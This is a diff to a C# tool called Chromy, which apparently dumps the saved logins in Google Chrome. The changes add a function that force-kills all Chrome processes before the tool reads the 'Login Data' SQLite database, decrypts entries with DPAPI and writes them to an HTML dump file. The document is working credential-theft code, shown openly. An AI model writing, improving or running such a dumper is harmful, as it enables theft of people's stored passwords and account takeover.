@@ -96,13 +96,23 @@ namespace Chromy
                 Decrypt("");
 
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write("\n$> DONE!");
+                Console.Write("\n$> DUMP DONE!");
                 Console.ForegroundColor = ConsoleColor.Red;
 
             }
 
             return null;
         }
+
+        #region Kill All Chrome Process
+        private static void KillChrome()
+        {
+            var chromeInstances = Process.GetProcessesByName("chrome");
+
+            foreach (Process p in chromeInstances)
+                p.Kill();
+        }
+        #endregion
 
         private static void PrintHelp()
         {
@@ -118,11 +128,13 @@ namespace Chromy
         {
             try
             {
+                Console.WriteLine("$> Killing Chrome");
+                KillChrome();
                 path += "ChromyDump.html";
                 StreamWriter Writer = new StreamWriter(path, false, Encoding.UTF8);
                 string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                     + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
-                Console.WriteLine("DB file = " + db_way);
+                Console.WriteLine("$> DB file = " + db_way);
 
                 string db_field = "logins";   // DB table field name
                 byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
